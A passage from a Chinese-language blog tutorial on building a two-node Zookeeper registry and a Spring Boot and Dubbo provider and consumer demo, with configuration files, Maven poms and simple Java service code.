<li>算法参见：<a class="link"   href="http://en.wikipedia.org/wiki/Consistent_hashing" >http://en.wikipedia.org/wiki/Consistent_hashing<i class="fas fa-external-link-alt"></i></a></li>
</ul>
</li>
</ul>
<h1 id="Zookeeper搭建注册中心"><a href="#Zookeeper搭建注册中心" class="headerlink" title="Zookeeper搭建注册中心"></a>Zookeeper搭建注册中心</h1><p>介绍了这么多，下面我们就开始实际操作，来看看Dubbo和Spring Cloud到底有什么不一样。我们先搭建微服务架构中最重要的注册中心，Dubbo可用使用Nacos、Zookeeper等作为注册中心，本文我们用<strong>Zookeeper</strong>搭建注册中心（Linux环境)。</p>
<h2 id="准备工作"><a href="#准备工作" class="headerlink" title="准备工作"></a>准备工作</h2><ul>
<li>确保Linux环境已经安装好JDK</li>
<li>Zookeeper下载地址:<a class="link"   href="https://zookeeper.apache.org/releases.html" >https://zookeeper.apache.org/releases.html<i class="fas fa-external-link-alt"></i></a></li>
<li>解压压缩包<br>我们搭建一个主从双节点的Zookeeper集群。在&#x2F;user&#x2F;local&#x2F;zookeeper-cluster&#x2F;目录下分别建立zookeeper-1和zookeeper-2两个文件夹，分别将压缩包解压至这俩个文件夹中，并在zookeeper-1和zookeeper-2两个文件夹中再创建一个data文件夹，用于存放数据。</li>
<li>将zookeeper解压目之&#x2F;conf目录中的zoo_sample.cfg配置文件名称修改为zoo.cfg。</li>
</ul>
<h2 id="配置集群"><a href="#配置集群" class="headerlink" title="配置集群"></a>配置集群</h2><ul>
<li>在每个zookeeper的data目录下创建一个myid文件，内容分别是1和2。这个文件就是记录每个服务器的ID。</li>
<li>修改zookeeper-1的zoo.cfg配置文件如下:</li>
</ul>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">端口号</span></span><br><span class="line">clientPort=2181</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">数据存储路径</span></span><br><span class="line">dataDir= /usr/local/zookeeper-cluster/zookeeper-1/data</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">在文件的最后加上zookeeper集群中两个节点的地址</span></span><br><span class="line">server.1=192.168.74.88:2881:3881</span><br><span class="line">server.2=192.168.74.88:2882:3882</span><br></pre></td></tr></table></figure>

<ul>
<li>修改zookeeper-2的zoo.cfg配置文件如下:</li>
</ul>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">端口号</span></span><br><span class="line">clientPort=2182</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">数据存储路径</span></span><br><span class="line">dataDir= /usr/local/zookeeper-cluster/zookeeper-2/data</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">在文件的最后加上zookeeper集群中两个节点的地址</span></span><br><span class="line">server.1=192.168.74.88:2881:3881</span><br><span class="line">server.2=192.168.74.88:2882:3882</span><br></pre></td></tr></table></figure>

<h2 id="启动集群"><a href="#启动集群" class="headerlink" title="启动集群"></a>启动集群</h2><ul>
<li>在每个zookeeper的bin目录下使用如下命令启动</li>
</ul>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">./zkServer.sh start</span><br></pre></td></tr></table></figure>

<ul>
<li><p>查看状态</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">./zkServer.sh status</span><br></pre></td></tr></table></figure></li>
</ul>
<p>启动成功后，查看状态后可以看到一个节点的角色为leader（主节点），另一个节点的角色为follower（从节点）。</p>
<h2 id="Zookeeper与Eureka的区别"><a href="#Zookeeper与Eureka的区别" class="headerlink" title="Zookeeper与Eureka的区别"></a>Zookeeper与Eureka的区别</h2><p>分布式领域有一个重要的的<strong>CAP理论</strong>，即 Consistency、Availability、Partition tolerance 三个词语的缩写，分别表示<strong>一致性、可用性、分区容忍性</strong>（详见<a class="link"   href="http://jimmyz.top/2020/08/15/dubbo/" >分布式事务解决方案<i class="fas fa-external-link-alt"></i></a>一文）。针对该理论，Zookeeper保证的是CP，而Eureka的设计遵循AP原则。但是对于服务发现而言，可用性比一致性更为重要。当然Spring Cloud也支持使用Zookeeper作为注册中心，不过不推荐使用。</p>
<h1 id="微服务开发"><a href="#微服务开发" class="headerlink" title="微服务开发"></a>微服务开发</h1><p>搭建完了注册中心，我们正式开始微服务的开发。首先，我们看一下入门项目的结构：</p>
<p><a href="https://imgtu.com/i/R2dnR1"><img  
                     lazyload
                     alt="image"
                     data-src="https://z3.ax1x.com/2021/07/03/R2dnR1.jpg"
                      alt="R2dnR1.jpg"
                ></a></p>
<p>父工程中包含接口工程、服务消费者微服务、服务提供者微服务。其中服务消费者和提供者都采用Springboot整合Dubbo进行开发。</p>
<h2 id="RPC服务接口"><a href="#RPC服务接口" class="headerlink" title="RPC服务接口"></a>RPC服务接口</h2><p>在服务接口开发中，我们不需要添加任何依赖，只要定义接口即可。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">interface</span> <span class="title class_">HelloSerrvice</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 同步调用方法</span></span><br><span class="line">    String <span class="title function_">sayHello</span><span class="params">(String name)</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>其pom文件为：</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;UTF-8&quot;</span>?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">project</span> <span class="attr">xmlns</span>=<span class="string">&quot;http://maven.apache.org/POM/4.0.0&quot;</span></span></span><br><span class="line"><span class="tag">         <span class="attr">xmlns:xsi</span>=<span class="string">&quot;http://www.w3.org/2001/XMLSchema-instance&quot;</span></span></span><br><span class="line"><span class="tag">         <span class="attr">xsi:schemaLocation</span>=<span class="string">&quot;http://maven.apache.org/POM/4.0.0 http://maven.apache.org/xsd/maven-4.0.0.xsd&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">parent</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>dubbo_liduoan_demo<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>dubbo_liduoan_demo<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">version</span>&gt;</span>1.0-SNAPSHOT<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">parent</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">modelVersion</span>&gt;</span>4.0.0<span class="tag">&lt;/<span class="name">modelVersion</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>APIInteface<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">build</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">plugins</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">plugin</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.apache.maven.plugins<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>maven-compiler-plugin<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">configuration</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">source</span>&gt;</span>1.8<span class="tag">&lt;/<span class="name">source</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">target</span>&gt;</span>1.8<span class="tag">&lt;/<span class="name">target</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;/<span class="name">configuration</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">plugin</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">plugins</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">build</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">project</span>&gt;</span></span><br></pre></td></tr></table></figure>

<h2 id="服务提供者"><a href="#服务提供者" class="headerlink" title="服务提供者"></a>服务提供者</h2><ul>
<li>导入依赖</li>
</ul>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;UTF-8&quot;</span>?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">project</span> <span class="attr">xmlns</span>=<span class="string">&quot;http://maven.apache.org/POM/4.0.0&quot;</span> <span class="attr">xmlns:xsi</span>=<span class="string">&quot;http://www.w3.org/2001/XMLSchema-instance&quot;</span></span></span><br><span class="line"><span class="tag">	<span class="attr">xsi:schemaLocation</span>=<span class="string">&quot;http://maven.apache.org/POM/4.0.0 https://maven.apache.org/xsd/maven-4.0.0.xsd&quot;</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">modelVersion</span>&gt;</span>4.0.0<span class="tag">&lt;/<span class="name">modelVersion</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">parent</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework.boot<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-boot-starter-parent<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">version</span>&gt;</span>2.0.1.RELEASE<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">relativePath</span>/&gt;</span> <span class="comment">&lt;!-- lookup parent from repository --&gt;</span></span><br><span class="line">	<span class="tag">&lt;/<span class="name">parent</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">groupId</span>&gt;</span>com.liduoan<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>provider<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">version</span>&gt;</span>0.0.1-SNAPSHOT<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">name</span>&gt;</span>provider<span class="tag">&lt;/<span class="name">name</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">description</span>&gt;</span>Demo project for Spring Boot<span class="tag">&lt;/<span class="name">description</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">properties</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">java.version</span>&gt;</span>1.8<span class="tag">&lt;/<span class="name">java.version</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;/<span class="name">properties</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">dependencies</span>&gt;</span></span><br><span class="line"></span><br><span class="line">		<span class="comment">&lt;!--dubbo--&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">			<span class="tag">&lt;<span class="name">groupId</span>&gt;</span>com.alibaba.spring.boot<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">			<span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>dubbo-spring-boot-starter<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">			<span class="tag">&lt;<span class="name">version</span>&gt;</span>2.0.0<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">		<span class="comment">&lt;!--spring-boot-stater--&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">			<span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework.boot<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">			<span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-boot-starter<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">			<span class="tag">&lt;<span class="name">exclusions</span>&gt;</span></span><br><span class="line">				<span class="tag">&lt;<span class="name">exclusion</span>&gt;</span></span><br><span class="line">					<span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>log4j-to-slf4j<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">					<span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.apache.logging.log4j<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">				<span class="tag">&lt;/<span class="name">exclusion</span>&gt;</span></span><br><span class="line">			<span class="tag">&lt;/<span class="name">exclusions</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">		<span class="comment">&lt;!--zookeeper--&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">			<span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.apache.zookeeper<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">			<span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>zookeeper<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">            <span class="comment">&lt;!--注意版本问题--&gt;</span></span><br><span class="line">			<span class="tag">&lt;<span class="name">version</span>&gt;</span>3.5.8<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">			<span class="tag">&lt;<span class="name">exclusions</span>&gt;</span></span><br><span class="line">				<span class="tag">&lt;<span class="name">exclusion</span>&gt;</span></span><br><span class="line">					<span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.slf4j<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">					<span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>slf4j-log4j12<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">				<span class="tag">&lt;/<span class="name">exclusion</span>&gt;</span></span><br><span class="line">				<span class="tag">&lt;<span class="name">exclusion</span>&gt;</span></span><br><span class="line">					<span class="tag">&lt;<span class="name">groupId</span>&gt;</span>log4j<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">					<span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>log4j<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">				<span class="tag">&lt;/<span class="name">exclusion</span>&gt;</span></span><br><span class="line">			<span class="tag">&lt;/<span class="name">exclusions</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"></span><br><span class="line">		<span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">			<span class="tag">&lt;<span class="name">groupId</span>&gt;</span>com.101tec<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">			<span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>zkclient<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">			<span class="tag">&lt;<span class="name">version</span>&gt;</span>0.9<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">			<span class="tag">&lt;<span class="name">exclusions</span>&gt;</span></span><br><span class="line">				<span class="tag">&lt;<span class="name">exclusion</span>&gt;</span></span><br><span class="line">					<span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>slf4j-log4j12<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">					<span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.slf4j<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">				<span class="tag">&lt;/<span class="name">exclusion</span>&gt;</span></span><br><span class="line">			<span class="tag">&lt;/<span class="name">exclusions</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">		<span class="comment">&lt;!--API--&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">			<span class="tag">&lt;<span class="name">groupId</span>&gt;</span>dubbo_liduoan_demo<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">			<span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>APIInteface<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">			<span class="tag">&lt;<span class="name">version</span>&gt;</span>1.0-SNAPSHOT<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">        <span class="comment">&lt;!--用于测试，可删去--&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">			<span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework.boot<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">			<span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-boot-test<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">			<span class="tag">&lt;<span class="name">version</span>&gt;</span>2.4.0<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">			<span class="tag">&lt;<span class="name">scope</span>&gt;</span>test<span class="tag">&lt;/<span class="name">scope</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">			<span class="tag">&lt;<span class="name">groupId</span>&gt;</span>junit<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">			<span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>junit<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">			<span class="tag">&lt;<span class="name">scope</span>&gt;</span>test<span class="tag">&lt;/<span class="name">scope</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.junit.jupiter<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>junit-jupiter-api<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">version</span>&gt;</span>5.7.0<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">scope</span>&gt;</span>test<span class="tag">&lt;/<span class="name">scope</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">			<span class="tag">&lt;<span class="name">groupId</span>&gt;</span>junit<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">			<span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>junit<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">			<span class="tag">&lt;<span class="name">version</span>&gt;</span>4.12<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;/<span class="name">dependencies</span>&gt;</span></span><br><span class="line"></span><br><span class="line">	<span class="tag">&lt;<span class="name">build</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">plugins</span>&gt;</span></span><br><span class="line">			<span class="tag">&lt;<span class="name">plugin</span>&gt;</span></span><br><span class="line">				<span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework.boot<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">				<span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-boot-maven-plugin<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">			<span class="tag">&lt;/<span class="name">plugin</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;/<span class="name">plugins</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;/<span class="name">build</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">project</span>&gt;</span></span><br></pre></td></tr></table></figure>

<blockquote>
<p>注意：本文使用的<code>dubbo-spring-boot-starter</code>依赖最高只支持Dubbo2.6版本的，如果要使用Dubbo2.7版本的Springboot启动器则依赖如下：</p>
</blockquote>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.apache.dubbo<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>dubbo-spring-boot-starter<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>2.7.x<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure>

<blockquote>
<p>这个依赖中的配置项以及注解和之前2.6版本相比，改动非常大。可见Dubbo的Springboot依赖的版本兼容做的并不好，本文使用是为了简单易懂。如果想要平滑升级，并且使用新版本的Dubbo，可以参考官方网站的依赖配置。</p>
</blockquote>
<ul>
<li>配置文件application.properties</li>
</ul>
<figure class="highlight properties"><table><tr><td class="code"><pre><span class="line"><span class="comment"># spring应用名</span></span><br><span class="line"><span class="attr">spring.application.name</span>=<span class="string">dubbo-demo-provider</span></span><br><span class="line"><span class="comment"># dubbo应用id</span></span><br><span class="line"><span class="attr">spring.dubbo.application.id</span>=<span class="string">dubbo-demo-provider</span></span><br><span class="line"><span class="comment"># dubbo应用名称</span></span><br><span class="line"><span class="attr">spring.dubbo.application.name</span>=<span class="string">dubbo-demo-provider</span></span><br><span class="line"><span class="comment"># 应用负责人</span></span><br><span class="line"><span class="comment">#spring.dubbo.application.owner=xxx</span></span><br><span class="line"><span class="comment"># 组织名</span></span><br><span class="line"><span class="comment">#spring.dubbo.application.organization=xxx</span></span><br><span class="line"><span class="comment"># zookeeper注册中心地址（多个节点用分号隔开）</span></span><br><span class="line"><span class="attr">spring.dubbo.registry.address</span>=<span class="string">zookeeper://192.168.74.88:2181;zookeeper://192.168.74.88:2182</span></span><br><span class="line"><span class="comment"># 是否是服务提供者</span></span><br><span class="line"><span class="attr">spring.dubbo.server</span>=<span class="string">true</span></span><br><span class="line"><span class="comment"># 协议名称，采用dubbo协议</span></span><br><span class="line"><span class="attr">spring.dubbo.protocol.name</span>=<span class="string">dubbo</span></span><br><span class="line"><span class="comment"># 协议序列化方式</span></span><br><span class="line"><span class="comment">#spring.dubbo.protocol.serialization=hessian2 </span></span><br><span class="line"><span class="comment"># 协议端口</span></span><br><span class="line"><span class="attr">spring.dubbo.protocol.port</span>=<span class="string">20880</span></span><br><span class="line"><span class="comment"># 远程服务超时时间</span></span><br><span class="line"><span class="comment">#spring.dubbo.provider.timeout=1000</span></span><br><span class="line"><span class="comment"># 远程服务调用重试次数</span></span><br><span class="line"><span class="comment">#spring.dubbo.provider.retries=0</span></span><br><span class="line"><span class="comment"># 负载均衡策略</span></span><br><span class="line"><span class="comment">#spring.dubbo.provider.loadbalance=roundrobin</span></span><br></pre></td></tr></table></figure>

<p>其中被注解的配置都是可选择部分，其余都是必须的配置。更多配置可查看<a class="link"   href="http://www.mamicode.com/info-detail-2501931.html" >配置清单<i class="fas fa-external-link-alt"></i></a>。</p>
<ul>
<li>启动类</li>
</ul>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// Dubbo注解</span></span><br><span class="line"><span class="meta">@EnableDubboConfiguration</span></span><br><span class="line"><span class="meta">@SpringBootApplication</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">ProviderApplication</span> &#123;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">		SpringApplication.run(ProviderApplication.class, args);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<ul>
<li>服务实现</li>
</ul>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@Component</span></span><br><span class="line"><span class="meta">@Service(interfaceClass = HelloSerrvice.class)</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">HelloServiceImpl</span> <span class="keyword">implements</span> <span class="title class_">HelloSerrvice</span> &#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">sayHello</span><span class="params">(String name)</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;liduoan&quot;</span> + name;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>该实现类上，除了以前Spring的注解，还添加了Dubbo的**@Service**注解(与spring中的@Service注解区别)，标识该类是一个服务提供者。其中常用的属性如下：</p>
<ol>
<li>interfaceClass : 标识该服务实现的接口</li>
<li>weight : 该服务的权重</li>
<li>cluster : 集群容错策略(failover, failfast, failsafe, failback, forking)</li>
<li>retries : 重试次数</li>
<li>loadbalance ：负载均衡策略(random, roundrobin, leastactive)</li>
<li>timeout : 超时时长</li>
<li>executes : 线程池最大线程数</li>
<li>actives : 占用连接最大请求数</li>
</ol>
<p>在整体上需要注意的点：</p>
<p>zookeeper是否允许外部连接上？</p>
<p>zookeeper版本是否对的上？</p>
<p>dubbo的版本和对应的配置是不一样的。</p>
<h2 id="服务消费者"><a href="#服务消费者" class="headerlink" title="服务消费者"></a>服务消费者</h2><ul>
<li>导入依赖</li>
</ul>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;UTF-8&quot;</span>?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">project</span> <span class="attr">xmlns</span>=<span class="string">&quot;http://maven.apache.org/POM/4.0.0&quot;</span> <span class="attr">xmlns:xsi</span>=<span class="string">&quot;http://www.w3.org/2001/XMLSchema-instance&quot;</span></span></span><br><span class="line"><span class="tag">	<span class="attr">xsi:schemaLocation</span>=<span class="string">&quot;http://maven.apache.org/POM/4.0.0 https://maven.apache.org/xsd/maven-4.0.0.xsd&quot;</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">modelVersion</span>&gt;</span>4.0.0<span class="tag">&lt;/<span class="name">modelVersion</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">parent</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework.boot<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-boot-starter-parent<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">version</span>&gt;</span>2.0.1.RELEASE<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">relativePath</span>/&gt;</span> <span class="comment">&lt;!-- lookup parent from repository --&gt;</span></span><br><span class="line">	<span class="tag">&lt;/<span class="name">parent</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">groupId</span>&gt;</span>com.example<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>consumer<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">version</span>&gt;</span>0.0.1-SNAPSHOT<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">name</span>&gt;</span>consumer<span class="tag">&lt;/<span class="name">name</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">description</span>&gt;</span>Demo project for Spring Boot<span class="tag">&lt;/<span class="name">description</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">properties</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">java.version</span>&gt;</span>1.8<span class="tag">&lt;/<span class="name">java.version</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;/<span class="name">properties</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">dependencies</span>&gt;</span></span><br><span class="line">		<span class="comment">&lt;!--springboot的web模块--&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">			<span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework.boot<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">			<span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-boot-starter-web<span 